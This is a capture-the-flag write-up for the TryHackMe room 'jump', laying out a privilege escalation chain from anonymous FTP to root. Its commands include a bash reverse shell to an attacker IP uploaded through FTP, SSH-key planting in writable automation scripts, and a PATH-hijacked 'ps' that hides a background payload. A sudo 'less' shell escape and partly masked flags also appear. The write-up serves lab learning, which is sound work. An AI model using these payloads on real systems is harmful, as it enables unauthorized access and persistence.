# jump

Room: https://tryhackme.com/room/jump

Use privilege escalation knowledge to jump from a normal user to root.

You’ve discovered a misconfigured internal automation pipeline running on a server. The system processes recon scripts, development backups, monitoring jobs, and deployment tasks across multiple users. Each stage of the pipeline relies too heavily on the previous one. By abusing these trust boundaries, you must move laterally through the system.

Your objective is to escalate from anonymous access all the way through:

recon_user → dev_user → monitor_user → ops_user → root

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/jr-penetration-tester/jump.md

---

**Attack path**

```text
anonymous FTP -> recon_user -> dev_user -> monitor_user -> ops_user -> root
```

**Important note**

The `dev_user -> monitor_user` step can appear broken if the hijacked process does not return cleanly to the original command. The fix is to make the payload do its work and then allow the expected process flow to continue.

---

## Environment

Replace these with your current room values.

```text
Attack box: ATTACK_IP
Target box: TARGET_IP
```

Example from my run:

```text
Attack box: 10.67.65.219
Target box: 10.67.175.56
```

---

## 1. Anonymous FTP Enumeration

Connect to FTP.

```bash
ftp TARGET_IP
```

Login as:

```text
anonymous
```

List the directories.

```text
ls -la
```

The important writable directory is the root FTP incoming folder:

```text
/incoming
```

Do not confuse it with:

```text
/pub/incoming
```

In this room, `/incoming` is the folder processed by the automation pipeline.

---

## 2. Initial Access as recon_user

Create a simple reverse shell payload.

```bash
cat > recon.sh <<'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/ATTACK_IP/4444 0>&1'
EOF

chmod +x recon.sh
```

Start a listener.

```bash
nc -lvnp 4444
```

Upload the payload to the root FTP incoming folder.

```bash
ftp TARGET_IP
```

FTP commands:

```text
anonymous
binary
cd incoming
put recon.sh
quit
```

When the automation processes the file, a shell should return as `recon_user`.

```bash
whoami
id
```

Expected user:

```text
recon_user
```

Read the first flag.

```bash
cat /home/recon_user/flag.txt
```

Flag:

```text
THM{5a3f1c92-xxxxxxx-8c2a-1f6e9b2a4c11}
```

---

## 3. recon_user to dev_user

Check the current user's groups.

```bash
id
```

`recon_user` is a member of the `dev_user` group.

Enumerate `/opt`.

```bash
ls -la /opt
ls -la /opt/dev
cat /opt/dev/backup.sh
```

The important finding is that `/opt/dev/backup.sh` is writable through the `dev_user` group.

Generate an SSH key on the attack box.

```bash
ssh-keygen -t ed25519 -f jump_key -N ""
cat jump_key.pub
```

Replace `/opt/dev/backup.sh` with a payload that plants the public key for `dev_user`.

```bash
cat > /opt/dev/backup.sh <<'EOF'
#!/bin/bash
mkdir -p /home/dev_user/.ssh
echo 'PASTE_PUBLIC_KEY_HERE' >> /home/dev_user/.ssh/authorized_keys
chmod 700 /home/dev_user/.ssh
chmod 600 /home/dev_user/.ssh/authorized_keys
chown -R dev_user:dev_user /home/dev_user/.ssh
EOF

chmod +x /opt/dev/backup.sh
```

Trigger the backup automation by uploading a basic `backup.sh` file to root FTP `/incoming`.

```bash
cat > backup.sh <<'EOF'
#!/bin/bash
echo backup trigger
EOF

chmod +x backup.sh
```

Upload it.

```bash
ftp TARGET_IP
```

FTP commands:

```text
anonymous
binary
cd incoming
put backup.sh
quit
```

After the automation runs, SSH in as `dev_user`.

```bash
chmod 600 jump_key
ssh -i jump_key dev_user@TARGET_IP
```

Confirm access.

```bash
whoami
id
```

Read the `dev_user` flag.

```bash
cat /home/dev_user/flag.txt
```

Flag:

```text
THM{8d2b7a41-xxxxxxxxxb1a2-6c7d9e8f0123}
```

---

## 4. dev_user to monitor_user

Inspect the healthcheck service.

```bash
cat /etc/systemd/system/healthcheck.service
cat /usr/local/bin/healthcheck
```

Important service configuration:

```text
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

The healthcheck script calls `ps` without an absolute path.

```bash
ps aux
```

Because `/opt/dev/bin` appears first in the service PATH, and `dev_user` can write to `/opt/dev/bin/ps`, this allows PATH hijacking.

Check write access.

```bash
ls -la /opt/dev/bin
```

Create a clean `ps` hijack.

```bash
cat > /opt/dev/bin/ps <<'EOF'
#!/bin/bash

(
  mkdir -p /home/monitor_user/.ssh
  echo 'PASTE_PUBLIC_KEY_HERE' >> /home/monitor_user/.ssh/authorized_keys
  chmod 700 /home/monitor_user/.ssh
  chmod 600 /home/monitor_user/.ssh/authorized_keys
  chown -R monitor_user:monitor_user /home/monitor_user/.ssh
  echo "monitor key planted as $(whoami) at $(date)" >> /tmp/monitor_key_planted.txt
) >/dev/null 2>&1 &

exec /usr/bin/ps "$@"
EOF

chmod +x /opt/dev/bin/ps
```

The key detail is that the payload runs in the background and then continues to the real `ps`.

```bash
exec /usr/bin/ps "$@"
```

This avoids breaking the original service flow.

Check the timer and service.

```bash
systemctl status healthcheck.timer --no-pager
systemctl status healthcheck.service --no-pager
systemctl list-timers --all | grep healthcheck
```

After the healthcheck service runs, SSH in as `monitor_user`.

```bash
ssh -i jump_key monitor_user@TARGET_IP
```

Confirm access.

```bash
whoami
id
```

Read the monitor flag.

```bash
cat /home/monitor_user/flag.txt
```

Flag:

```text
THM{c1e9a7b3xxxxxxxxx-3b6c2d5a9f77}
```

---

## 5. Checking for a Broken or Missed healthcheck State

If the `monitor_user` step does not trigger, check the timer state.

```bash
systemctl status healthcheck.timer --no-pager
systemctl status healthcheck.service --no-pager
systemctl list-timers --all | grep healthcheck
systemctl show healthcheck.service -p Result -p ExecMainStatus -p ExecMainCode
```

A bad or missed state may look like this:

```text
Active: active (elapsed)
Trigger: n/a
```

And the timer list may show no future run.

```text
NEXT: -
```

The service may show:

```text
Active: inactive (dead)
Result=success
ExecMainCode=0
ExecMainStatus=0
```

This means the service has already run successfully and is not scheduled to run again.

If this happens before `/opt/dev/bin/ps` is prepared, the `dev_user -> monitor_user` step will not trigger. Reboot or redeploy the room and retry. Make sure the `ps` hijack is clean and returns to the original command.

---

## 6. monitor_user to ops_user

As `monitor_user`, enumerate files owned by `ops_user`.

```bash
find / -group ops_user -ls 2>/dev/null
find / -user ops_user -ls 2>/dev/null | head -100
find /opt -writable -ls 2>/dev/null
```

Important findings:

```text
/opt/app
/usr/local/bin/deploy.sh
/home/ops_user
/opt/app/deploy_helper.sh
/opt/app/data
```

Inspect the deploy script.

```bash
cat /usr/local/bin/deploy.sh
```

It runs:

```bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

`deploy.sh` is owned by `ops_user`, but `deploy_helper.sh` is writable by `monitor_user`.

Replace `deploy_helper.sh` with an SSH key plant for `ops_user`.

```bash
cat > /opt/app/deploy_helper.sh <<'EOF'
#!/bin/bash
mkdir -p /home/ops_user/.ssh
echo 'PASTE_PUBLIC_KEY_HERE' >> /home/ops_user/.ssh/authorized_keys
chmod 700 /home/ops_user/.ssh
chmod 600 /home/ops_user/.ssh/authorized_keys
chown -R ops_user:ops_user /home/ops_user/.ssh
echo "ops key planted as $(whoami) at $(date)" >> /tmp/ops_key_planted.txt
EOF

chmod +x /opt/app/deploy_helper.sh
```

Check sudo permissions.

```bash
sudo -l
```

Important permission:

```text
(ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

Run the deploy script as `ops_user`.

```bash
sudo -u ops_user /usr/local/bin/deploy.sh
```

SSH in as `ops_user`.

```bash
ssh -i jump_key ops_user@TARGET_IP
```

Confirm access.

```bash
whoami
id
```

Read the `ops_user` flag.

```bash
cat /home/ops_user/flag.txt
```

Flag:

```text
THM{f7a2c9d1-xxxxxxxxx-9c0a7b2e4d88}
```

---

## 7. ops_user to root

Check sudo permissions.

```bash
sudo -l
```

Important permission:

```text
(root) NOPASSWD: /usr/bin/less
```

Run `less` as root.

```bash
sudo /usr/bin/less /etc/hosts
```

Inside `less`, type:

```text
!/bin/bash
```

Confirm root.

```bash
whoami
id
```

Read the root flag.

```bash
cat /root/flag.txt
```

Flag:

```text
THM{2b8e6c4a-1xxxxxxxxxx-5e9d1b7f6a22}
```

---

## 8. Collect All Flags

From root, collect all flags.

```bash
find /root /home -type f \( -iname '*flag*' -o -iname 'user.txt' -o -iname 'root.txt' \) -exec echo "----- {} -----" \; -exec cat {} \; 2>/dev/null
```
---

## Key Takeaways

The room is based on a chain of automation and trust issues.

```text
anonymous FTP upload triggers recon automation
recon_user can modify dev backup automation
dev_user can hijack PATH for monitor_user healthcheck
monitor_user can modify deploy helper used by ops_user
ops_user can run less as root
```

The important fix for the `monitor_user` step is to avoid breaking the process you hijack. Start your action in the background if needed, then continue to the expected original command.
